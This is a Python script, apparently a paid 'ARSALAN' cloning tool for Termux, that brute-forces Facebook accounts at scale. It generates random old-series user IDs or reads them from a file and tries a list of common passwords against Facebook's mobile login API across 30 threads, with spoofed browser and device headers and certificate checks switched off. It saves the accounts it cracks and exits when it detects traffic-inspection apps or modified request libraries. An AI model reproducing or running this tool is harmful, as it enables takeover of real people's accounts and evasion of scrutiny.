import os
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Tool Version definition
TOOL_VERSION = "v2.0"

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Initial setup and loading
os.system('clear')
print('\x1b[38;5;46mARSALAN SERVER LOADING.... [ ' + TOOL_VERSION + ' ]')

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')

# --- GITHUB APPROVAL SYSTEM ---
def arsalan_approval():
    os.system('clear')
    uuid_raw = str(os.getlogin()) + str(os.getuid())
    key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]
    github_link = "https://raw.githubusercontent.com/khanisalma748-a11y/salmakhani/main/APROVEL-78"
    print("\033[1;31m   ____  _____ _____  _    _     _      _   ")
    print("\033[1;32m / \\   | _\\_ _/ \\  ||    / \\  || |")
    print("\033[1;33m/ _ \\  | |_)| | _\\  | / _ \\  || |")
    print("\033[1;34m/__ \\  _< || |/__ \\ |/ /__ \\ |\\ \\__")
    print("\033[1;35m_/  \\__\\__\\_/_/  \\__\\__/____/\\____/ \\__")
    print(f"\033[1;36m--------------------------------------------- [{TOOL_VERSION}] \033[0m")
    print('\x1b[38;5;48m--------------------------------------------------------')
    print(f'\x1b[1;37mYOUR KEY : \x1b[1;32mARSALAN-{key}')
    print('\x1b[38;5;48m--------------------------------------------------------')
    print("\033[1;36m🟩 Available TOOL PRICES\033[0m")
    print("\033[1;31m" + "-" * 40 + "\033[0m")
    print("\033[1;32m[1] 5 Dollars 7 days \033[0m")
    print("\033[1;33m[2] 10 Dollars 15 days \033[0m")
    print("\033[1;34m[3] 18 Dollars 30 days \033[0m")
    print("\033[1;31m" + "-" * 40 + "\033[0m")
    print("\x1b[1;37mStatus: \x1b[1;31mChecking Approval...")

time.sleep(2)
print(f"\033[32;41m\t Welcome ARSALAN TOOL 🔥 ({TOOL_VERSION}) \033[0m")

# --- Anti-tampering and Security Checks ---
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

import random

def window1():
    chrome_major = random.choice(range(120, 140))
    build_1 = random.choice(range(6000, 7100))
    A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
    chrome_major_alt = random.choice(range(125, 142))
    build_2 = random.choice(range(6200, 7150))
    patch_2 = random.choice(range(50, 250))
    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
    chrome_major_ent = random.choice(range(118, 135))
    build_3 = random.choice(range(5800, 6800))
    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
    latest_build = random.randint(7000, 7500)
    latest_patch = random.randint(100, 300)
    chrome_ultra = random.choice(range(140, 146))
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write(f'\x1b]2;👑【 A.R.S.A.L.A.N 👑 - {TOOL_VERSION} 】\x07')


def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print(f"""\033[1;32m
==========================================                                                         
╔═══╗  ╔═╗╔═╗ ╔═╗╔═╗  ╔═╗
║████╗ ║██║██  ║██╚███████║███████║██  ║██║██  ║██
║██╚██╗║██║██══╝██     ║██║██════╗╚██══╝██║██══╝██
║██ ╚██╝██║███████     ║██╚███████╔╝██████║███████
║██  ╚████╚██══╝██     ║██╔════╝██╚██══╝██╚██══╝██
╚██   ╚███ ╚█████      ╚██╚███████ ╚██████ ╚█████ 
OWNER : ARSALAN CLONER 804
TOOLS : OLD ID CLONING ({TOOL_VERSION})
==========================================                            
\033[0m""")


def linex():
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE (RANDOM)')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mFILE UID CLONE (ids.txt)')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    elif __Jihad__ in ('B', 'b', '02', '2'):
        file_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def file_clone():
    global user
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mFILE UID CLONING")
    linex()
    try:
        file_path = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mENTER FILE PATH (e.g ids.txt) {Y}:{G} ")
        if not file_path:
            file_path = "ids.txt"
        with open(file_path, "r") as f:
            for line in f:
                uid = line.strip()
                if uid:
                    user.append(uid)
    except Exception as e:
        print(f"\n    {rad}[!] File not found or error reading file!")
        time.sleep(2)
        BNG_71_()
        return

    linex()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL LOADED IDs {Y}: {G}{len(user)}")
    linex()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM FILE {Y}: {G} {len(user)}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            pool.submit(login_1, uid)


def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            pool.submit(login_1, uid)


def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            pool.submit(login_1, uid)


def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            pool.submit(login_1, uid)


def login_1(uid):
    global loop
    try:
        pw_list = ['123456', '1234567', '12345678', '123456789']
        for pw in pw_list:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc2342',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol',
                'api_key': '882a8490361d98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-api.facebook.com',
                'X-FB-Net-HNI': str(random.choice(range(20000, 40000))),
                'X-FB-SIM-HNI': str(random.choice(range(20000, 40000))),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid==;pid==;tid=',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Connection': 'Keep-Alive'
            }
            response = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers, timeout=10, verify=False)
            q = response.json()
            if 'access_token' in q:
                print(f'\r\r\033[1;32m[ARSALAN-OK] {uid} | {pw}')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(q):
                print(f'\r\r\033[1;33m[ARSALAN-CP] {uid} | {pw}')
                cps.append(uid)
                break
        
        loop += 1
        sys.stdout.write(f"\r\r\x1b[1;37m[\x1b[1;37mARSALAN\x1b[38;5;196m]\x1b[1;37m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
        sys.stdout.flush()
    except Exception as e:
        pass


if __name__ == '__main__':
    BNG_71_()
